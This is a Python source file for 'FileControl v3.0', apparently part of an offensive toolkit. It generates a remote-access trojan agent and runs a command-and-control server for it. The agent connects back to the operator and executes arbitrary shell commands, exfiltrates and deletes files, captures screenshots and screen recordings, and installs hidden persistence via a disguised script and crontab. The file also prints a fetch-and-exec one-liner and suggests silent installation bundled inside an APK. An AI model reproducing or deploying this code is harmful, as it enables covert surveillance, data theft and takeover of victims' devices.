#!/usr/bin/env python3
"""
███████╗██╗██╗     ███████╗ ██████╗ ██████╗ ███╗   ██╗████████╗██████╗  ██████╗ ██╗
██╔════╝██║██║     ██╔════╝██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔═══██╗██║
█████╗  ██║██║     █████╗  ██║     ██║   ██║██╔██╗ ██║   ██║   ██████╔╝██║   ██║██║
██╔══╝  ██║██║     ██╔══╝  ██║     ██║   ██║██║╚██╗██║   ██║   ██╔══██╗██║   ██║██║
██║     ██║███████╗███████╗╚██████╗╚██████╔╝██║ ╚████║   ██║   ██║  ██║╚██████╔╝███████╗
╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
FileControl v3.0 - Remote File Manager, Persistence & Surveillance
"""

import os
import sys
import json
import base64
import socket
import threading
import subprocess
from datetime import datetime

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))
from core.colors import colors


class FileController:
    """Remote file management and persistence module"""
    
    def __init__(self):
        self.lhost = ''
        self.lport = 5555
        self.running = False
        self.connected = False
        self.conn = None
        self.target_info = {}
    
    def banner(self):
        print(f"""
{colors.RED}╔══════════════════════════════════════════════════╗
║{colors.CYAN}   ███████╗██╗██╗     ███████╗ ██████╗ ██████╗ ███╗   ██╗████████╗██████╗  ██████╗ ██╗{colors.RED}║
║{colors.CYAN}   ██╔════╝██║██║     ██╔════╝██╔════╝██╔═══██╗████╗  ██║╚══██╔══╝██╔══██╗██╔═══██╗██║{colors.RED}║
║{colors.CYAN}   █████╗  ██║██║     █████╗  ██║     ██║   ██║██╔██╗ ██║   ██║   ██████╔╝██║   ██║██║{colors.RED}║
║{colors.CYAN}   ██╔══╝  ██║██║     ██╔══╝  ██║     ██║   ██║██║╚██╗██║   ██║   ██╔══██╗██║   ██║██║{colors.RED}║
║{colors.CYAN}   ██║     ██║███████╗███████╗╚██████╗╚██████╔╝██║ ╚████║   ██║   ██║  ██║╚██████╔╝███████╗{colors.RED}║
║{colors.CYAN}   ╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝{colors.RED}║
║{colors.GREEN}          Remote File Manager, Persistence & Backdoor Control v3.0   {colors.RED}║
╚══════════════════════════════════════════════════╝{colors.RESET}
        """)
    
    def generate_agent(self):
        """Generate the remote agent payload"""
        agent_code = f'''#!/usr/bin/env python3
# PhantomOmen FileControl Agent v3.0
# Run this on target device

import os,sys,json,base64,socket,subprocess,threading,time,shutil
from datetime import datetime

LHOST = "{self.lhost}"
LPORT = {self.lport}
PERSISTENCE = True

def get_info():
    info = {{
        "hostname": os.uname().nodename if hasattr(os, 'uname') else "Unknown",
        "platform": sys.platform,
        "cwd": os.getcwd(),
        "python": sys.version,
        "time": datetime.now().isoformat()
    }}
    # List drives/storage
    info["storage"] = []
    paths = ["/sdcard", "/storage/emulated/0", "/data/data", "/"]
    for p in paths:
        if os.path.exists(p):
            try:
                stat = os.statvfs(p)
                info["storage"].append({{
                    "path": p,
                    "total": stat.f_frsize * stat.f_blocks,
                    "free": stat.f_frsize * stat.f_bfree
                }})
            except:
                pass
    return info

def handle_command(cmd):
    """Handle incoming command"""
    try:
        parts = cmd.strip().split()
        if not parts:
            return "{{"status":"error","msg":"Empty command"}}"
        
        command = parts[0].lower()
        
        if command == "ping":
            return json.dumps({{"status":"ok","msg":"pong","info":get_info()}})
        
        elif command == "exec":
            # Execute system command
            shell_cmd = " ".join(parts[1:]) if len(parts) > 1 else ""
            result = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, timeout=30)
            return json.dumps({{
                "status":"ok",
                "cmd": shell_cmd,
                "stdout": result.stdout[:2000],
                "stderr": result.stderr[:1000],
                "returncode": result.returncode
            }})
        
        elif command == "shell":
            # Interactive shell
            shell_cmd = " ".join(parts[1:]) if len(parts) > 1 else ""
            result = subprocess.run(shell_cmd, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout[:3000] + ("\\n[STDERR]: " + result.stderr[:500] if result.stderr else "")
        
        elif command == "ls":
            path = parts[1] if len(parts) > 1 else "."
            if not os.path.exists(path):
                return json.dumps({{"status":"error","msg":f"Path not found: {{path}}"}})
            items = []
            try:
                for entry in os.listdir(path):
                    full = os.path.join(path, entry)
                    try:
                        stat = os.stat(full)
                        items.append({{
                            "name": entry,
                            "size": stat.st_size,
                            "is_dir": os.path.isdir(full),
                            "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                            "permissions": oct(stat.st_mode)[-3:]
                        }})
                    except:
                        items.append({{"name": entry, "size": 0, "is_dir": False}})
            except:
                pass
            return json.dumps({{"status":"ok","path":path,"items":items[:100]}})
        
        elif command == "download":
            path = " ".join(parts[1:]) if len(parts) > 1 else ""
            if not os.path.exists(path):
                return json.dumps({{"status":"error","msg":"File not found"}})
            if os.path.getsize(path) > 10*1024*1024:
                return json.dumps({{"status":"error","msg":"File too large (>10MB)"}})
            try:
                with open(path, "rb") as f:
                    data = base64.b64encode(f.read()).decode()
                return json.dumps({{"status":"ok","path":path,"data":data,"size":len(data)}})
            except Exception as e:
                return json.dumps({{"status":"error","msg":str(e)}})
        
        elif command == "upload":
            # upload <path> <base64_data>
            if len(parts) < 3:
                return json.dumps({{"status":"error","msg":"Usage: upload <path> <base64_data>"}})
            path = parts[1]
            data = parts[2]
            try:
                decoded = base64.b64decode(data)
                os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
                with open(path, "wb") as f:
                    f.write(decoded)
                return json.dumps({{"status":"ok","path":path,"size":len(decoded)}})
            except Exception as e:
                return json.dumps({{"status":"error","msg":str(e)}})
        
        elif command == "delete":
            path = " ".join(parts[1:]) if len(parts) > 1 else ""
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path)
                else:
                    os.remove(path)
                return json.dumps({{"status":"ok","path":path,"action":"deleted"}})
            except Exception as e:
                return json.dumps({{"status":"error","msg":str(e)}})
        
        elif command == "screenshot":
            try:
                result = subprocess.run(["screencap", "-p", "/tmp/screen.png"], capture_output=True, timeout=10)
                if os.path.exists("/tmp/screen.png"):
                    with open("/tmp/screen.png", "rb") as f:
                        data = base64.b64encode(f.read()).decode()
                    os.remove("/tmp/screen.png")
                    return json.dumps({{"status":"ok","type":"screenshot","data":data}})
            except:
                pass
            return json.dumps({{"status":"error","msg":"Screenshot not available"}})
        
        elif command == "keylog_start":
            # Start keylogger (simplified)
            return json.dumps({{"status":"ok","msg":"Keylogger started (requires AccessibilityService)"}})
        
        elif command == "record":
            # Start recording
            duration = parts[1] if len(parts) > 1 else "10"
            try:
                result = subprocess.run(["screenrecord", "--time-limit", duration, "/tmp/record.mp4"], capture_output=True, timeout=int(duration)+5)
                if os.path.exists("/tmp/record.mp4"):
                    with open("/tmp/record.mp4", "rb") as f:
                        data = base64.b64encode(f.read()).decode()
                    os.remove("/tmp/record.mp4")
                    return json.dumps({{"status":"ok","type":"screen_record","data":data,"duration":duration}})
            except:
                pass
            return json.dumps({{"status":"error","msg":"Screen recording failed"}})
        
        elif command == "persist":
            methods = []
            # Method 1: init.d
            try:
                script_path = "/data/local/tmp/.systemd"
                with open(script_path, "w") as f:
                    f.write("#!/bin/sh\\nwhile true; do\\n  python3 /data/local/tmp/agent.py &\\n  sleep 300\\ndone\\n")
                os.chmod(script_path, 0o755)
                methods.append("init.d script created")
            except:
                pass
            # Method 2: crontab
            try:
                cron_line = f"*/5 * * * * python3 /data/local/tmp/agent.py"
                result = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
                existing = result.stdout + "\\n" + cron_line + "\\n"
                subprocess.run(["crontab"], input=existing, text=True, capture_output=True)
                methods.append("crontab persistence added")
            except:
                pass
            return json.dumps({{"status":"ok","methods":methods}})
        
        elif command == "help":
            return json.dumps({{
                "status":"ok",
                "commands": {{
                    "ping": "Check connection & get device info",
                    "exec <cmd>": "Execute system command",
                    "shell <cmd>": "Execute shell command (raw output)",
                    "ls <path>": "List directory contents",
                    "download <path>": "Download file from target",
                    "upload <path> <b64>": "Upload file to target",
                    "delete <path>": "Delete file/directory",
                    "screenshot": "Take screenshot",
                    "record <sec>": "Record screen (seconds)",
                    "persist": "Install persistence",
                    "keylog_start": "Start keylogger",
                    "help": "Show this help"
                }}
            }})
        
        else:
            return json.dumps({{"status":"error","msg":f"Unknown command: {{command}}"}})
            
    except Exception as e:
        return json.dumps({{"status":"error","msg":str(e)}})

def connect_and_control():
    """Connect to C2 server and handle commands"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((LHOST, LPORT))
            
            # Send device info
            info = json.dumps(get_info())
            s.send(info.encode() + b"\\n")
            
            # Listen for commands
            buffer = ""
            while True:
                try:
                    data = s.recv(65536).decode()
                    if not data:
                        break
                    buffer += data
                    
                    while "\\n" in buffer:
                        cmd, buffer = buffer.split("\\n", 1)
                        cmd = cmd.strip()
                        if cmd:
                            response = handle_command(cmd)
                            s.send(response.encode() + b"\\n")
                except socket.timeout:
                    s.send(json.dumps({{"status":"keepalive"}}).encode() + b"\\n")
                except Exception as e:
                    break
            
            s.close()
        except Exception as e:
            pass
        
        time.sleep(10)

if __name__ == "__main__":
    connect_and_control()
'''
        
        # Save agent
        output_dir = os.path.join(os.path.dirname(__file__), '../../output')
        os.makedirs(output_dir, exist_ok=True)
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        agent_path = os.path.join(output_dir, f'phantom_agent_{timestamp}.py')
        
        with open(agent_path, 'w', encoding='utf-8') as f:
            f.write(agent_code)
        
        # Create a one-liner for easy deployment
        oneliner = f'python3 -c "import urllib.request;exec(urllib.request.urlopen(\\'http://{self.lhost}:{self.lport+1}/agent.py\\').read())"'
        
        print(f"\n{colors.GREEN}[+] Agent generated: {agent_path}{colors.RESET}")
        print(f"\n{colors.YELLOW}[!] Deployment methods:{colors.RESET}")
        print(f"  1. Copy agent to target and run: python3 agent.py")
        print(f"  2. Host agent and run one-liner on target:")
        print(f"     {colors.CYAN}{oneliner}{colors.RESET}")
        print(f"  3. Bundle with APK Binder for silent installation")
        
        return agent_path
    
    def start_c2_server(self):
        """Start C2 server for agent control"""
        print(f"\n{colors.GREEN}[+] Starting C2 server on {self.lhost}:{self.lport}...{colors.RESET}")
        print(f"{colors.YELLOW}[!] Waiting for agent connection...{colors.RESET}")
        print(f"{colors.DIM}[*] Available commands: ping, exec, shell, ls, download, upload, delete, screenshot, record, persist, help{colors.RESET}")
        print(f"{colors.DIM}[*] Type 'help' for detailed usage{colors.RESET}")
        
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.lport))
        server.listen(5)
        
        def handle_agent(conn, addr):
            print(f"\n{colors.GREEN}[+] Agent connected from {addr[0]}:{addr[1]}{colors.RESET}")
            self.connected = True
            self.conn = conn
            
            # Receive initial info
            try:
                info_data = conn.recv(4096).decode()
                info = json.loads(info_data)
                print(f"\n{colors.CYAN}═══════════════════════════════════════{colors.RESET}")
                print(f"{colors.GREEN}[📱] TARGET INFO:{colors.RESET}")
                for k, v in info.items():
                    if k != 'storage':
                        print(f"  {colors.CYAN}{k}:{colors.RESET} {v}")
                if 'storage' in info:
                    for s in info['storage']:
                        print(f"  {colors.CYAN}Storage:{colors.RESET} {s['path']} - Free: {s['free']//1024//1024}MB / Total: {s['total']//1024//1024}MB")
                print(f"{colors.CYAN}═══════════════════════════════════════{colors.RESET}")
            except:
                pass
            
            # Interactive command loop
            try:
                while True:
                    cmd = input(f"\n{colors.RED}▶ {colors.CYAN}{addr[0]}{colors.RESET} $ ").strip()
                    
                    if cmd.lower() in ('exit', 'quit', 'back'):
                        break
                    
                    if not cmd:
                        continue
                    
                    if cmd.lower() == 'clear':
                        os.system('clear')
                        continue
                    
                    conn.send((cmd + '\n').encode())
                    
                    try:
                        response = conn.recv(65536).decode()
                        try:
                            parsed = json.loads(response)
                            self.display_response(parsed, cmd)
                        except:
                            print(f"{colors.YELLOW}{response}{colors.RESET}")
                    except socket.timeout:
                        print(f"{colors.RED}[!] Timeout waiting for response{colors.RESET}")
            except (BrokenPipeError, ConnectionResetError):
                print(f"\n{colors.RED}[!] Agent disconnected{colors.RESET}")
            finally:
                self.connected = False
                conn.close()
        
        while not self.connected:
            try:
                conn, addr = server.accept()
                handle_agent(conn, addr)
            except KeyboardInterrupt:
                print(f"\n{colors.YELLOW}[!] C2 server stopped{colors.RESET}")
                break
    
    def display_response(self, parsed, cmd):
        """Display structured response"""
        status = parsed.get('status', 'error')
        
        if status == 'ok':
            msg = parsed.get('msg', '')
            info = parsed.get('info', {})
            items = parsed.get('items', [])
            stdout = parsed.get('stdout', '')
            stderr = parsed.get('stderr', '')
            data = parsed.get('data', '')
            commands = parsed.get('commands', {})
            methods = parsed.get('methods', [])
            
            if msg:
                print(f"{colors.GREEN}[+] {msg}{colors.RESET}")
            
            if info:
                print(f"\n{colors.GREEN}[📱] Device Info:{colors.RESET}")
                for k, v in info.items():
                    if k != 'storage':
                        print(f"  {colors.CYAN}{k}:{colors.RESET} {v}")
                if 'storage' in info:
                    for s in info['storage']:
                        print(f"  {colors.CYAN}Storage:{colors.RESET} {s['path']} - Free: {s['free']//1024//1024}MB / Total: {s['total']//1024//1024}MB")
            
            if items:
                dirs = [i for i in items if i.get('is_dir')]
                files = [i for i in items if not i.get('is_dir')]
                print(f"\n{colors.CYAN}Directories: {len(dirs)} | Files: {len(files)}{colors.RESET}")
                for i in items[:50]:
                    icon = "📁" if i.get('is_dir') else "📄"
                    size = i.get('size', 0)
                    size_str = f"{size:,}B" if size < 1024 else f"{size//1024:,}KB" if size < 1024*1024 else f"{size//1024//1024}MB"
                    print(f"  {icon} {i['name']:30s} {colors.DIM}{size_str:>10s}{colors.RESET}")
            
            if stdout:
                print(f"{colors.YELLOW}{stdout}{colors.RESET}")
            if stderr:
                print(f"{colors.RED}{stderr}{colors.RESET}")
            
            if data:
                if 'type' in parsed and parsed['type'] == 'screenshot':
                    # Save screenshot
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    img_path = os.path.join(os.path.dirname(__file__), f'../../output/screenshots/screen_{timestamp}.png')
                    os.makedirs(os.path.dirname(img_path), exist_ok=True)
                    with open(img_path, 'wb') as f:
                        f.write(base64.b64decode(data))
                    print(f"{colors.GREEN}[📸] Screenshot saved: {img_path}{colors.RESET}")
                else:
                    # Save downloaded file
                    path = parsed.get('path', 'downloaded_file')
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    file_path = os.path.join(os.path.dirname(__file__), f'../../output/downloads/{timestamp}_{os.path.basename(path)}')
                    os.makedirs(os.path.dirname(file_path), exist_ok=True)
                    with open(file_path, 'wb') as f:
                        f.write(base64.b64decode(data))
                    print(f"{colors.GREEN}[💾] File saved: {file_path}{colors.RESET}")
            
            if methods:
                print(f"{colors.GREEN}[+] Persistence methods:{colors.RESET}")
                for m in methods:
                    print(f"  ✓ {m}")
            
            if commands:
                print(f"\n{colors.CYAN}Available Commands:{colors.RESET}")
                for cmd, desc in commands.items():
                    print(f"  {colors.YELLOW}{cmd:25s}{colors.RESET} {desc}")
        else:
            error = parsed.get('msg', 'Unknown error')
            print(f"{colors.RED}[!] Error: {error}{colors.RESET}")
    
    def run(self):
        """Main execution"""
        os.system('clear' if os.name == 'posix' else 'cls')
        self.banner()
        
        print(f"\n{colors.CYAN}[+] FileControl - Remote Agent Manager{colors.RESET}")
        
        # Get config
        self.lhost = input(f"{colors.YELLOW}[?] LHOST (your IP): {colors.RESET}").strip()
        while not self.lhost:
            self.lhost = input(f"{colors.YELLOW}[?] LHOST: {colors.RESET}").strip()
        
        port = input(f"{colors.YELLOW}[?] LPORT [5555]: {colors.RESET}").strip()
        self.lport = int(port) if port else 5555
        
        print(f"\n{colors.GREEN}[+] Generating agent...{colors.RESET}")
        agent_path = self.generate_agent()
        
        print(f"\n{colors.YELLOW}[?] Start C2 server now? (Y/n): {colors.RESET}")
        if input().strip().lower() != 'n':
            self.start_c2_server()
